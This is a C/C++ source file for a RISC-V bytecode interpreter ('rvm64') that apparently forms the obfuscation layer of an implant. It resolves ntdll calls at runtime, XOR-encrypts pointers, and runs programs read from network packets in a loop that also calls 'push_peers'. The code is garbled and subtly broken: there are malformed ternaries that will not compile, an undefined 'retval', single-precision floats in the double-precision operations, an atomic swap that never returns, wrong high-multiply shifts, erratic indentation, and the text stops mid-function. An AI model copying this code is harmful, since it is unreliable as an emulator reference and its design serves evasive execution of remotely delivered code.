#include <windows.h>
#include <stdint.h>
#include <stddef.h>

#include "mock.hpp"
#include "vreg.hpp"

__data __hexane __context = { };
#define HEXANE auto ctx = (__hexane*)&__context;

__inline __function uintptr_t decrypt_ptr(uintptr_t ptr) { 
    return ptr ^ __key;
};

constexpr uintptr_t encrypt_ptr(uintptr_t ptr) { 
    return ptr ^ __key; 
}

__rdata const opcode encoding[] = {
    { 0b1010011, typenum::rtype  }, { 0b1000011, typenum::rtype  }, { 0b0110011, typenum::rtype  },
    { 0b1000111, typenum::r4type }, { 0b1001011, typenum::r4type }, { 0b1001111, typenum::r4type },
    { 0b0000011, typenum::itype  }, { 0b0001111, typenum::itype  }, { 0b1100111, typenum::itype  },
    { 0b0010011, typenum::itype  }, { 0b1110011, typenum::itype  }, { 0b0100011, typenum::stype  },
    { 0b0100111, typenum::stype  }, { 0b1100011, typenum::btype  }, { 0b0010111, typenum::utype  },
    { 0b0110111, typenum::utype  }, { 0b1101111, typenum::jtype  }, 
};

#pragma region VMCS_STATE
__used register uintptr_t m_modbase asm(REG_MODBASE);
__used register uintptr_t m_dkey    asm(REG_DKEY);
__used register uintptr_t m_program asm(REG_PROGRAM); 

__used register uint8_t   m_vstack[VSTACK_MAX_CAPACITY]     asm(REG_VSTACK);
__used register uintptr_t m_vscratch[VSCRATCH_MAX_CAPACITY] asm(REG_VSCRATCH);
__used register uintptr_t m_vregs[VREGS_MAX_CAPACITY]       asm(REG_VREGS);

__data uintptr_t m_program_size;
__data uintptr_t m_load_rsv_addr;
__data int       m_load_rsv_valid;

__data int m_halt; 
__data int m_reason;
__data int m_icount;
__data int m_step;

__data CONTEXT m_vm_context;
__data CONTEXT m_host_context;

typedef struct {
    uintptr_t mod_base;
    uintptr_t dkey;
    uintptr_t program; 
    uintptr_t program_size;

    uint8_t vstack[VSTACK_MAX_CAPACITY]; 
    uint8_t vscratch[VSCRATCH_MAX_CAPACITY];
    uint8_t vregs[VREGS_MAX_CAPACITY];
} vmcs_t;
#pragma endregion // VM_STATE

namespace rvm64 {
namespace routines { };
namespace operations { };
namespace decoder { };
};

__function int64_t vm_main(void) {
    while(!m_halt) {
        vmcs_t vmcs = { };

        if (!read_program_from_packet(m_program)) { 
            continue; 
        }

        vm_init(&vmcs); 
        vm_entry(&vmcs); 
        vm_end(&vmcs);

        push_peers();
    };

    return (int64_t) m_reason;
}

__function void save_host_context(void) {
    HEXANE;
    NTSTATUS status = 0;

    if (!NT_SUCCESS(status = ctx->win32.NtGetContextThread(NtCurrentThread(), &m_host_context))) {
        m_halt = 1;
        m_reason = status;
    }
}

__function void restore_host_context(void) {
    HEXANE;
    NTSTATUS status = 0;

    if (!NT_SUCCESS(status = ctx->win32.NtSetContextThread(NtCurrentThread(), &m_host_context))) {
        m_halt = 1;
        m_reason = vm_reason::access_violation;
    }
}

__function void save_vm_context(void) {
    HEXANE;
    NTSTATUS status = 0;

    if (!NT_SUCCESS(status = ctx->win32.NtGetContextThread(NtCurrentThread(), &m_vm_context))) {
        m_halt = 1;
        m_reason = status;
    }
}

__function void restore_vm_context(void) {
    HEXANE;
    NTSTATUS status = 0;

    if (!NT_SUCCESS(status = ctx->win32.NtSetContextThread(NtCurrentThread(), &m_vm_context))) {
        m_halt = 1;
        m_reason = status;
    }
}

__function void vm_init_memory(void) {
    HEXANE;
    NTSTATUS status = 0;

    m_program_size = PROCESS_MAX_CAPACITY;
    m_load_rsv_valid = false;
    m_load_rsv_addr = 0LL;

    ctx->win32.NtGetContextThread = GetProcAddress(GetModuleHandle("ntdll.dll"), "NtGetContextThread");
    ctx->win32.NtSetContextThread = GetProcAddress(GetModuleHandle("ntdll.dll"), "NtSetContextThread");
    ctx->win32.NtAllocateVirtualMemory = GetProcAddress(GetModuleHandle("ntdll.dll"), "NtAllocateVirtualMemory");
    ctx->win32.NtFreeVirtualMemory = GetProcAddress(GetModuleHandle("ntdll.dll"), "NtFreeVirtualMemory");
    ctx->win32.NtGetFileSize = GetProcAddress(GetModuleHandle("kernel32.dll"), "GetFileSize");
    ctx->win32.NtReadFile = GetProcAddress(GetModuleHandle("kernel32.dll"), "ReadFile");
    ctx->win32.NtOpenFile = GetProcAddress(GetModuleHandle("kernel32.dll"), "OpenFile");

    if (!NT_SUCCESS(status = ctx->win32.NtAllocateVirtualMemory(NtCurrentProcess(), (void**)&m_program, 0,
                                                                &m_program_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
        m_halt = 1;
        m_reason = status;
        return;
    }
}

__function void vm_end() {
    HEXANE;
    NTSTATUS status = 0;

    if (!NT_SUCCESS(status = ctx->win32.NtFreeVirtualMemory(NtCurrentProcess(), (void**)&m_program, (size_t*)&m_program_size, MEM_RELEASE))) {
        m_halt = 1;
        m_reason = status;
        return;
    }
}

__function void vm_set_load_rsv(uintptr_t address) {
    m_load_rsv_addr = address;
    m_load_rsv_valid = true;
}

__function void vm_clear_load_rsv() {
    m_load_rsv_addr = 0LL;
    m_load_rsv_valid = false;
}

__function bool vm_check_load_rsv(uintptr_t address) const {
    return m_load_rsv_valid && m_load_rsv_addr == address;
}

__function void vm_stkchk(uintptr_t sp) {
    if (sp < *(uintptr_t*)m_vregs || sp >= *(uintptr_t*)m_vregs + VSTACK_SIZE) {
        m_halt = 1;
        m_reason = vm_reason::access_violation;
        return;
    }

    if (((*sp ^ __stack_cookie) | (*(sp + sizeof(uintptr_t)) ^ __stack_cookie)) != 0) {
        m_halt = 1;
        m_reason = vm_reason::stack_overflow;
        return;
    }
}


bool is_nan(double x) {
    union {
        double d;
        uint64_t u;
    } converter;

    converter.d = x;

    uint64_t exponent = converter.u & EXPONENT_MASK;
    uint64_t fraction = converter.u & FRACTION_MASK;

    return (exponent == EXPONENT_MASK) && (fraction != 0);
}

__function void rv_fadd_d(uint8_t rs2, uint8_t rs1, uint8_t rd) {
    float v1 = 0, v2 = 0;

    reg_read(float, rs1, v1);
    reg_read(float, rs2, v2);
    reg_write(float, rd, (v1 + v2));
}

__function void rv_fsub_d(uint8_t rs2, uint8_t rs1, uint8_t rd) {
    float v1 = 0, v2 = 0;

    reg_read(float, rs1, v1);
    reg_read(float, rs2, v2);
    reg_write(float, rd, (v1 - v2));
}

__function void rv_fmul_d(uint8_t rs2, uint8_t rs1, uint8_t rd) {
    float v1 = 0, v2 = 0;

    reg_read(float, rs1, v1);
    reg_read(float, rs2, v2);
    reg_write(float, rd, (v1 * v2));
}

__function void rv_fdiv_d(uint8_t rs2, uint8_t rs1, uint8_t rd) {
    float v1 = 0, v2 = 0;

    reg_read(float, rs1, v1);
    reg_read(float, rs2, v2);
    reg_write(float, rd, (v1 / v2));
}

__function void rv_fmv_d_x(uint8_t rs2, uint8_t rs1, uint8_t rd) {
    int64_t v1 = 0;

    reg_read(int64_t, rs1, v1);
    reg_write(int64_t, rd, v1);
}

__function void rv_fcvt_s_d(uint8_t rs2, uint8_t rs1, uint8_t rd) {
    float v1 = 0;

    reg_read(double, rs1, v1);
    reg_write(float, rd, v1);
}

__function void rv_fcvt_d_s(uint8_t rs2, uint8_t rs1, uint8_t rd) {
    double v1 = 0;

    reg_read(float, rs1, v1);
    reg_write(double, rd, v1);
}

__function void rv_fcvt_w_d(uint8_t rs2, uint8_t rs1, uint8_t rd) {
    int32_t v1 = 0;

    reg_read(double, rs1, v1);
    reg_write(int32_t, rd, v1);
}

__function void rv_fcvt_wu_d(uint8_t rs2, uint8_t rs1, uint8_t rd) {
    uint32_t v1 = 0;

    reg_read(double, rs1, v1);
    reg_write(uint32_t, rd, v1);
}

__function void rv_fcvt_d_w(uint8_t rs2, uint8_t rs1, uint8_t rd) {
    int32_t v1 = 0;

    reg_read(int32_t, rs1, v1);
    reg_write(double, rd, v1);
}

__function void rv_fcvt_d_wu(uint8_t rs2, uint8_t rs1, uint8_t rd) {
    uint32_t v1 = 0;

    reg_read(uint32_t, rs1, v1);
    reg_write(double, rd, v1);
}

__function void rv_fsgnj_d(uint8_t rs2, uint8_t rs1, uint8_t rd) {
    int64_t v1 = 0, v2 = 0;

    reg_read(int64_t, rs1, v1);
    reg_read(int64_t, rs2, v2);

    int64_t s2 = (v2 >> 63) & 1;

    v1 &= ~(1LL << 63);
    v1 |= (s2 << 63);

    reg_write(int64_t, rd, v1);
}

__function void rv_fsgnjn_d(uint8_t rs2, uint8_t rs1, uint8_t rd) {
    int64_t v1 = 0, v2 = 0;

    reg_read(int64_t, rs1, v1);
    reg_read(int64_t, rs2, v2);

    int64_t s2 = ((v2 >> 63) & 1) ^ 1;

    v1 &= ~(1LL << 63);
    v1 |= (s2 << 63);

    reg_write(int64_t, rd, v1);
}

__function void rv_fsgnjx_d(uint8_t rs2, uint8_t rs1, uint8_t rd) {
    int64_t v1 = 0, v2 = 0;

    reg_read(int64_t, rs1, v1);
    reg_read(int64_t, rs2, v2);

    int64_t s1 = (v1 >> 63) & 1;
    int64_t s2 = (v2 >> 63) & 1;

    v1 &= ~(1LL << 63);
    v1 |= ((s1 ^ s2) << 63);

    reg_write(int64_t, rd, v1);
}

__function void rv_fmin_d(uint8_t rs2, uint8_t rs1, uint8_t rd) {
    double v1 = 0, v2 = 0;

    reg_read(double, rs1, v1);
    reg_read(double, rs2, v2);

    if (is_nan(v1)) {
        reg_write(double, rd, v2);
    } else if (is_nan(v2)) {
        reg_write(double, rd, v1);
    } else {
        reg_write(double, rd, (v1 > v2) ? v2 : v1);
    }
}

__function void rv_fmax_d(uint8_t rs2, uint8_t rs1, uint8_t rd) {
    double v1 = 0, v2 = 0;

    reg_read(double, rs1, v1);
    reg_read(double, rs2, v2);

    if (is_nan(v1)) {
        reg_write(double, rd, v2);
    } else if (is_nan(v2)) {
        reg_write(double, rd, v1);
    } else {
        reg_write(double, rd, (v1 > v2) ? v1 : v2);
    }
}

__function void rv_feq_d(uint8_t rs2, uint8_t rs1, uint8_t rd) {
    double v1 = 0, v2 = 0;

    reg_read(double, rs1, v1);
    reg_read(double, rs2, v2);

    if (is_nan(v1) || is_nan(v2)) {
        reg_write(bool, rd, false);
        return;
    }

    reg_write(bool, rd, (v1 == v2));
}

__function void rv_flt_d(uint8_t rs2, uint8_t rs1, uint8_t rd) {
double v1 = 0, v2 = 0;

reg_read(double, rs1, v1);
reg_read(double, rs2, v2);

if (is_nan(v1) || is_nan(v2)) {
    reg_write(bool, rd, false);
    return;
}

reg_write(bool, rd, (v1 < v2));
          }

          __function void rv_fle_d(uint8_t rs2, uint8_t rs1, uint8_t rd) {
          double v1 = 0, v2 = 0;

          reg_read(double, rs1, v1);
          reg_read(double, rs2, v2);

          if (is_nan(v1) || is_nan(v2)) {
          reg_write(bool, rd, false);
          return;
          }

          reg_write(bool, rd, (v1 <= v2));
            }

__function void rv_fclass_d(uint8_t rs2, uint8_t rs1, uint8_t rd) {
    double v1 = 0;
    union {
        double d;
        int64_t u;
    } converter;

    reg_read(double, rs1, v1);
    converter.d = v1;

    uint64_t exponent = converter.u >> 52 & 0x7FF;
    uint64_t fraction = converter.u & 0xFFFFFFFFFFFFF;
    uint64_t sign = converter.u >> 63;

    if (exponent == 0x7FF) {
        if (fraction == 0) {
            ? (sign == 0) 
                ? reg_write(int, rd, 0x7) 
                : reg_write(int, rd, 0x0); // +/- infinity

            : (fraction & (1LL << 51))
                ? reg_write(int, rd, 0x8) 
                : reg_write(int, rd, 0x9); // signaling NaN / quiet NaN

        } else if (exponent == 0) {
            (fraction == 0) 
                ? (sign == 0) 
                ? reg_write(int, rd, 0x4) 
                : reg_write(int, rd, 0x3); // +/- 0

                : (sign == 0) 
                ? reg_write(int, rd, 0x5) 
                : reg_write(int, rd, 0x2); // +/- subnormal
        } else {
            (sign == 0) 
                ? reg_write(int, rd, 0x6) 
                : reg_write(int, rd, 0x1); // +/- normal
        }
    }
}

__function void rv_lrw(uint8_t rs2, uint8_t rs1, uint8_t rd) {
    uintptr_t address = 0;
    int32_t word = 0; 

    reg_read(uintptr_t, rs1, address);
    mem_read(int32_t, address, word);

    reg_write(int64_t, rd, retval);
    rvm64::routines::set_load_rsv(address);
}

__function void rv_scw(uint8_t rs2, uint8_t rs1, uint8_t rd) {
uintptr_t address = 0;
int32_t word = 0;

mem_read(uintptr_t, rs1, address);
reg_read(int32_t, rs2, word);

if (rvm64::routines::vm_check_load_rsv(address)) {
    mem_write(int32_t, address, word);
    reg_write(int32_t, rd, 0);

              rvm64::routines::vm_clear_load_rsv();
              } else {
              reg_write(int32_t, rd, 1);
                        }
                        }

                  __function void rv_amoswap_w(uint8_t rs2, uint8_t rs1, uint8_t rd) {
                  uintptr_t address = 0;
                  int32_t v1 = 0, v2 = 0;

                  mem_read(uintptr_t, rs1, address);

                  while (true) {
        if (rvm64::routines::vm_check_load_rsv(address)) {
            continue;
        }
        rvm64::routines::vm_set_load_rsv(address);

        mem_read(int32_t, address, v1);
        reg_write(int32_t, rd, v1);

        reg_read(int32_t, rs2, v2);
        mem_write(int32_t, address, v2);

        rvm64::routines::vm_clear_load_rsv();
        return;
    }
}

__function void rv_amoadd_w(uint8_t rs2, uint8_t rs1, uint8_t rd) {
    uintptr_t address = 0;
    int32_t v1 = 0, v2 = 0;

    mem_read(uintptr_t, rs1, address);

    while (true) {
        if (rvm64::routines::vm_check_load_rsv(address)) {
            continue;
        }
        rvm64::routines::vm_set_load_rsv(address);

        reg_read(int32_t, rs2, v2);
        mem_read(int32_t, address, v1);

        reg_write(int32_t, rd, v1);
        mem_write(int32_t, address, (v1 + v2));

        rvm64::routines::vm_clear_load_rsv();
        return;
    }
}

__function void rv_amoxor_w(uint8_t rs2, uint8_t rs1, uint8_t rd) {
    uintptr_t address = 0;
    int32_t v1 = 0, v2 = 0;

    reg_read(uintptr_t, rs1, address);

    while (true) {
        if (rvm64::routines::vm_check_load_rsv(address)) {
            continue;
        }
        rvm64::routines::vm_set_load_rsv(address);

        reg_read(int32_t, rs2, v2);
        mem_read(int32_t, address, v1);

        reg_write(int32_t, rd, v1);
        mem_write(int32_t, address, (v1 ^ v2));

        rvm64::routines::vm_clear_load_rsv();
        return;
    }
}

__function void rv_amoand_w(uint8_t rs2, uint8_t rs1, uint8_t rd) {
    uintptr_t address = 0;
    int32_t v1 = 0, v2 = 0;

    reg_read(uintptr_t, rs1, address);

    while (true) {
        if (rvm64::routines::vm_check_load_rsv(address)) {
            continue;
        }
        rvm64::routines::vm_set_load_rsv(address);

        reg_read(int32_t, rs2, v2);
        mem_read(int32_t, address, v1);

        reg_write(int32_t, rd, v1);
        mem_write(int32_t, address, (v1 & v2));

        rvm64::routines::vm_clear_load_rsv();
        return;
    }
}

__function void rv_amoor_w(uint8_t rs2, uint8_t rs1, uint8_t rd) {
    uintptr_t address = 0;
    int32_t v1 = 0, v2 = 0;

    reg_read(uintptr_t, rs1, address);

    while (true) {
        if (rvm64::routines::vm_check_load_rsv(address)) {
            continue;
        }
        rvm64::routines::vm_set_load_rsv(address);

        reg_read(int32_t, rs2, v2);
        mem_read(int32_t, address, v1);

        reg_write(int32_t, rd, v1);
        mem_write(int32_t, address, (v1 | v2));

        rvm64::routines::vm_clear_load_rsv();
        return;
    }
}

__function void rv_amomin_w(uint8_t rs2, uint8_t rs1, uint8_t rd) {
uintptr_t address = 0;
int32_t v1 = 0, v2 = 0;

reg_read(uintptr_t, rs1, address);
while (true) {
if (rvm64::routines::vm_check_load_rsv(address)) {
    continue;
}
rvm64::routines::vm_set_load_rsv(address);

reg_read(int32_t, rs2, v2);
mem_read(int32_t, address, v1);

reg_write(int32_t, rd, v1);
mem_write(int32_t, address, (v1 < v2 ? v1 : v2));

          rvm64::routines::vm_clear_load_rsv();
          return;
          }
          }

               __function void rv_amomax_w(uint8_t rs2, uint8_t rs1, uint8_t rd) {
               uintptr_t address = 0;
               int32_t v1 = 0, v2 = 0;

               reg_read(uintptr_t, rs1, address);
               while (true) {
               if (rvm64::routines::vm_check_load_rsv(address)) {
               continue;
               }
               rvm64::routines::vm_set_load_rsv(address);

               reg_read(int32_t, rs2, v2);
               mem_read(int32_t, address, v1);

               reg_write(int32_t, rd, v1);
               mem_write(int32_t, address, (v1 < v2 ? v2 : v1));

               rvm64::routines::vm_clear_load_rsv();
               return;
               }
               }

                                __function void rv_amominu_w(uint8_t rs2, uint8_t rs1, uint8_t rd) {
uintptr_t address = 0;
uint32_t v1 = 0, v2 = 0;

reg_read(uintptr_t, rs1, address);
while (true) {
if (rvm64::routines::vm_check_load_rsv(address)) {
    continue;
}
rvm64::routines::vm_set_load_rsv(address);

reg_read(uint32_t, rs2, v2);
mem_read(uint32_t, address, v1);

reg_write(uint32_t, rd, v1);
mem_write(uint32_t, address, (v1 < v2 ? v1 : v2));

          rvm64::routines::vm_clear_load_rsv();
          return;
          }
          }

               __function void rv_amomaxu_w(uint8_t rs2, uint8_t rs1, uint8_t rd) {
               uintptr_t address = 0;
               uint32_t v1 = 0, v2 = 0;

               reg_read(uintptr_t, rs1, address);
               while (true) {
               if (rvm64::routines::vm_check_load_rsv(address)) {
               continue;
               }
               rvm64::routines::vm_set_load_rsv(address);

               reg_read(uint32_t, rs2, v2);
               mem_read(uint32_t, address, v1);

               reg_write(uint32_t, rd, v1);
               mem_write(uint32_t, address, (v1 < v2 ? v2 : v1));

               rvm64::routines::vm_clear_load_rsv();
               return;
               }
               }

                          __function void rv_lrd(uint8_t rs2, uint8_t rs1, uint8_t rd) {
    uintptr_t address = 0;
    int64_t value = 0;

    reg_read(uintptr_t, rs1, address);
    rvm64::routines::vm_set_load_rsv(address);

    mem_read(int64_t, address, value);
    reg_write(int64_t, rd, value);
}

__function void rv_scd(uint8_t rs2, uint8_t rs1, uint8_t rd) {
int64_t value = 0;
uintptr_t address = 0;

reg_read(uintptr_t, rs1, address);
reg_read(int64_t, rs2, value);

if (!rvm64::routines::vm_check_load_rsv(address)) {
reg_write(int64_t, rd, 1);
          return;
          }

          mem_write(int64_t, address, value);
          rvm64::routines::vm_clear_load_rsv();
          }

               __function void rv_amoswap_d(uint8_t rs2, uint8_t rs1, uint8_t rd) {
    uintptr_t address = 0;
    int64_t v1 = 0, v2 = 0;

    mem_read(uintptr_t, rs1, address);

    while (true) {
        if (rvm64::routines::vm_check_load_rsv(address)) {
            continue;
        }

        rvm64::routines::vm_set_load_rsv(address);

        mem_read(int64_t, address, v1);
        reg_write(int64_t, rd, v1);

        reg_read(int64_t, rs2, v2);
        mem_write(int64_t, address, v2);

        rvm64::routines::vm_clear_load_rsv();
    }
}

__function void rv_amoadd_d(uint8_t rs2, uint8_t rs1, uint8_t rd) {
    uintptr_t address = 0;
    int64_t v1 = 0, v2 = 0;

    mem_read(uintptr_t, rs1, address);

    while(true) {
        if (rvm64::routines::vm_check_load_rsv(address)) {
            continue;
        }

        rvm64::routines::vm_set_load_rsv(address);

        mem_read(int64_t, address, v1);
        reg_read(int64_t, rs2, v2);

        mem_write(int64_t, address, (v1 + v2));
        reg_write(int64_t, rd, v1);

        rvm64::routines::vm_clear_load_rsv();
        return;
    }
}

__function void rv_amoxor_d(uint8_t rs2, uint8_t rs1, uint8_t rd) {
    uintptr_t address = 0;
    int64_t v1 = 0, v2 = 0;

    reg_read(uintptr_t, rs1, address);

    while (true) {
        if (rvm64::routines::vm_check_load_rsv(address)) {
            continue;
        }

        rvm64::routines::vm_set_load_rsv(address);

        reg_read(int64_t, rs2, v2);
        mem_read(int64_t, address, v1);

        reg_write(int64_t, rd, v1);
        mem_write(int64_t, address, (v1 ^ v2));

        rvm64::routines::vm_clear_load_rsv();
        return;
    }
}

__function void rv_amoand_d(uint8_t rs2, uint8_t rs1, uint8_t rd) {
    uintptr_t address = 0;
    int64_t v1 = 0, v2 = 0;

    reg_read(uintptr_t, rs1, address);

    while (true) {
        if (rvm64::routines::vm_check_load_rsv(address)) {
            continue;
        }

        rvm64::routines::vm_set_load_rsv(address);

        reg_read(int64_t, rs2, v2);
        mem_read(int64_t, address, v1);

        reg_write(int64_t, rd, v1);
        mem_write(int64_t, address, (v1 & v2));

        rvm64::routines::vm_clear_load_rsv();
        return;
    }
}

__function void rv_amoor_d(uint8_t rs2, uint8_t rs1, uint8_t rd) {
    uintptr_t address = 0;
    int64_t v1 = 0, v2 = 0;

    reg_read(uintptr_t, rs1, address);

    while(true) {
        if (rvm64::routines::vm_check_load_rsv(address)) {
            continue;
        }

        rvm64::routines::vm_set_load_rsv(address);

        reg_read(int64_t, rs2, v2);
        mem_read(int64_t, address, v1);

        reg_write(int64_t, rd, v1);
        mem_write(int64_t, address, (v1 | v2));

        rvm64::routines::vm_clear_load_rsv();
        return;
    }
}

__function void rv_amomin_d(uint8_t rs2, uint8_t rs1, uint8_t rd) {
uintptr_t address = 0;
uint64_t v1 = 0, v2 = 0;

reg_read(uintptr_t, rs1, address);
while(true) {
if (rvm64::routines::vm_check_load_rsv(address)) {
    continue;
}

rvm64::routines::vm_set_load_rsv(address);

reg_read(uint64_t, rs2, v2);
mem_read(uint64_t, address, v1);

reg_write(uint64_t, rd, v1);
mem_write(uint64_t, address, (v1 < v2 ? v1 : v2));

          rvm64::routines::vm_clear_load_rsv();
          return;
          }
          }

               __function void rv_amomax_d(uint8_t rs2, uint8_t rs1, uint8_t rd) {
               uintptr_t address = 0;
               int64_t v1 = 0, v2 = 0;

               reg_read(uintptr_t, rs1, address);
               while (true) {
               if (rvm64::routines::vm_check_load_rsv(address)) {
               continue;
               }

               rvm64::routines::vm_set_load_rsv(address);

               reg_read(int64_t, rs2, v2);
               mem_read(int64_t, address, v1);

               reg_write(int64_t, rd, v1);
               mem_write(int64_t, address, (v1 < v2 ? v2 : v1));

               rvm64::routines::vm_clear_load_rsv();
               return;
               }
               }

                                __function void rv_amominu_d(uint8_t rs2, uint8_t rs1, uint8_t rd) {
                                    uintptr_t address = 0;
                                    uint64_t v1 = 0, v2 = 0;

                                    reg_read(uintptr_t, rs1, address);
                                    while (true) {
                                        if (rvm64::routines::vm_check_load_rsv(address)) {
                                            continue;
                                        }

                                        rvm64::routines::vm_set_load_rsv(address);

                                        reg_read(uint64_t, rs2, v2);
                                        mem_read(uint64_t, address, v1);

                                        reg_write(uint64_t, rd, v1);
                                        mem_write(uint64_t, address, (v1 < v2 ? v1 : v2));

                                        rvm64::routines::vm_clear_load_rsv();
                                        return;
                                    }
                                }

               __function void rv_amomaxu_d(uint8_t rs2, uint8_t rs1, uint8_t rd) {
                uintptr_t address = 0;
                uint64_t v1 = 0, v2 = 0;

                reg_read(uintptr_t, rs1, address);
                while (true) {
                    if (rvm64::routines::vm_check_load_rsv(address)) {
                        continue;
                    }

                    rvm64::routines::vm_set_load_rsv(address);

                    reg_read(uint64_t, rs2, v2);
                    mem_read(uint64_t, address, v1);

                    reg_write(uint64_t, rd, v1);
                    mem_write(uint64_t, address, (v1 < v2 ? v2 : v1));

                    rvm64::routines::vm_clear_load_rsv();
                    return;
                }
            }

                           __function void rv_addw(uint8_t rs2, uint8_t rs1, uint8_t rd) {
    int32_t v1 = 0, v2 = 0;

    reg_read(int32_t, rs1, v1);
    reg_read(int32_t, rs2, v2);
    reg_write(int64_t, rd, (int64_t)(v1 + v2));
}

__function void rv_subw(uint8_t rs2, uint8_t rs1, uint8_t rd) {
    int32_t v1 = 0, v2 = 0;

    reg_read(int32_t, rs1, v1);
    reg_read(int32_t, rs2, v2);
    reg_write(int64_t, rd, (int64_t)(v1 - v2));
}

__function void rv_mulw(uint8_t rs2, uint8_t rs1, uint8_t rd) {
    int32_t v1 = 0, v2 = 0;

    reg_read(int32_t, rs1, v1);
    reg_read(int32_t, rs2, v2);
    reg_write(int64_t, rd, (int64_t)(v1 * v2));
}

__function void rv_srlw(uint8_t rs2, uint8_t rs1, uint8_t rd) {
    int32_t v1 = 0, v2 = 0;

    reg_read(int32_t, rs1, v1);
    reg_read(int32_t, rs2, v2);

    int shamt = v2 & 0x1F;
    reg_write(int32_t, rd, (v1 >> shamt));
}

__function void rv_sraw(uint8_t rs2, uint8_t rs1, uint8_t rd) {
    int32_t v1 = 0, v2 = 0;

    reg_read(int32_t, rs1, v1);
    reg_read(int32_t, rs2, v2);

    uint8_t shamt = v2 & 0x1F;
    reg_write(int32_t, rd, (v1 >> shamt));
}

__function void rv_divuw(uint8_t rs2, uint8_t rs1, uint8_t rd) {
    uint32_t v1 = 0, v2 = 0;

    reg_read(uint32_t, rs1, v1);
    reg_read(uint32_t, rs2, v2);
    reg_write(uint32_t, rd, (v1 / v2));
}

__function void rv_sllw(uint8_t rs2, uint8_t rs1, uint8_t rd) {
    int32_t v1 = 0, v2 = 0;

    reg_read(int32_t, rs1, v1);
    reg_read(int32_t, rs2, v2);

    int shamt = v2 & 0x1F;
    reg_write(int32_t, rd, (v1 << shamt));
}

__function void rv_divw(uint8_t rs2, uint8_t rs1, uint8_t rd) {
    int32_t v1 = 0, v2 = 0;

    reg_read(int32_t, rs1, v1);
    reg_read(int32_t, rs2, v2);
    reg_write(int32_t, rd, (v1 / v2));
}

__function void rv_remw(uint8_t rs2, uint8_t rs1, uint8_t rd) {
    int32_t v1 = 0, v2 = 0;

    reg_read(int32_t, rs1, v1);
    reg_read(int32_t, rs2, v2);
    reg_write(int32_t, rd, (v1 % v2));
}

__function void rv_remuw(uint8_t rs2, uint8_t rs1, uint8_t rd) {
    uint32_t v1 = 0, v2 = 0;

    reg_read(uint32_t, rs1, v1);
    reg_read(uint32_t, rs2, v2);
    reg_write(uint32_t, rd, (v1 % v2));
}

__function void rv_add(uint8_t rs2, uint8_t rs1, uint8_t rd) {
    int32_t v1 = 0, v2 = 0;

    reg_read(int32_t, rs1, v1);
    reg_read(int32_t, rs2, v2);
    reg_write(int32_t, rd, (v1 + v2));
}

__function void rv_sub(uint8_t rs2, uint8_t rs1, uint8_t rd) {
    int32_t v1 = 0, v2 = 0;

    reg_read(int32_t, rs1, v1);
    reg_read(int32_t, rs2, v2);
    reg_write(int32_t, rd, (v1 - v2));
}

__function void rv_mul(uint8_t rs2, uint8_t rs1, uint8_t rd) {
    int32_t v1 = 0, v2 = 0;

    reg_read(int32_t, rs1, v1);
    reg_read(int32_t, rs2, v2);
    reg_write(int32_t, rd, (v1 * v2));
}

__function void rv_sll(uint8_t rs2, uint8_t rs1, uint8_t rd) {
    int32_t v1 = 0, v2 = 0;

    reg_read(int32_t, rs1, v1);
    reg_read(int32_t, rs2, v2);

    int shamt = v2 & 0x1F;
    reg_write(int32_t, rd, (v1 << shamt));
}

__function void rv_mulh(uint8_t rs2, uint8_t rs1, uint8_t rd) {
    intptr_t v1 = 0, v2 = 0;

    reg_read(intptr_t, rs1, v1);
    reg_read(intptr_t, rs2, v2);

#if UINTPTR_MAX == 0xFFFFFFFF
    int64_t result = (int64_t)(int32_t)v1 * (int64_t)(int32_t)v2;
    reg_write(int32_t, rd, (result >> 32));

#elif UINTPTR_MAX == 0xFFFFFFFFFFFFFFFF
    __int128 result = (__int128)(int64_t)v1 * (__int128)(int64_t)v2;
    reg_write(int64_t, rd, (result >> 64));

#endif
}

__function void rv_slt(uint8_t rs2, uint8_t rs1, uint8_t rd) {
    intptr_t v1 = 0, v2 = 0;

    reg_read(intptr_t, rs1, v1);
    reg_read(intptr_t, rs2, v2);
    reg_write(intptr_t, rd, ((v1 < v2) ? 1 : 0));
}

__function void rv_mulhsu(uint8_t rs2, uint8_t rs1, uint8_t rd) {
    intptr_t v1 = 0;
    uintptr_t v2 = 0;

    reg_read(intptr_t, rs1, v1);
    reg_read(uintptr_t, rs2, v2);

#if UINTPTR_MAX == 0xFFFFFFFF
    int64_t result = (int64_t)(int32_t)v1 * (uint64_t)(uint32_t)v2;
    reg_write(int32_t, rd, (result >> 32));

#elif UINTPTR_MAX == 0xFFFFFFFFFFFFFFFF
    __int128 result = (__int128)(int64_t)v1 * (__uint128_t)(uint64_t)v2;
    reg_write(int64_t, rd, (result >> 64));

#endif
}

__function void rv_sltu(uint8_t rs2, uint8_t rs1, uint8_t rd) {
    uintptr_t v1 = 0, v2 = 0;

    reg_read(uintptr_t, rs1, v1);
    reg_read(uintptr_t, rs2, v2);
    reg_write(uintptr_t, rd, ((v1 < v2) ? 1 : 0));
}

__function void rv_mulhu(uint8_t rs2, uint8_t rs1, uint8_t rd) {
    uintptr_t v1 = 0, v2 = 0;

    reg_read(uintptr_t, rs1, v1);
    reg_read(uintptr_t, rs2, v2);

    uintptr_t result = v1 * v2;
#if UINTPTR_MAX == 0xFFFFFFFF
    reg_write(uintptr_t, rd, (result >> 16));

#elif UINTPTR_MAX == 0xFFFFFFFFFFFFFFFF
    reg_write(uintptr_t, rd, (result >> 32));
#endif
}

__function void rv_xor(uint8_t rs2, uint8_t rs1, uint8_t rd) {
    uintptr_t v1 = 0, v2 = 0;

    reg_read(uintptr_t, rs1, v1);
    reg_read(uintptr_t, rs2, v2);
    reg_write(uintptr_t, rd, (v1 ^ v2));
}

__function void rv_div(uint8_t rs2, uint8_t rs1, uint8_t rd) {
    uintptr_t v1 = 0, v2 = 0;

    reg_read(uintptr_t, rs1, v1);
    reg_read(uintptr_t, rs2, v2);
    reg_write(uintptr_t, rd, (v1 / v2));
}

__function void rv_srl(uint8_t rs2, uint8_t rs1, uint8_t rd) {
    uintptr_t v1 = 0, v2 = 0;

    reg_read(uintptr_t, rs1, v1);
    reg_read(uintptr_t, rs2, v2);

    uintptr_t shamt = (v2 & 0x1F);
    reg_write(uintptr_t, rd, (v1 >> shamt));
}

__function void rv_sra(uint8_t rs2, uint8_t rs1, uint8_t rd) {
    intptr_t v1 = 0;
    uint8_t v2 = 0;

    reg_read(intptr_t, rs1, v1);
    reg_read(uint8_t, rs2, v2);

    uint8_t shamt = (v2 & 0x1F);
    reg_write(intptr_t, rd, (v1 >> shamt));
}

__function void rv_divu(uint8_t rs2, uint8_t rs1, uint8_t rd) {
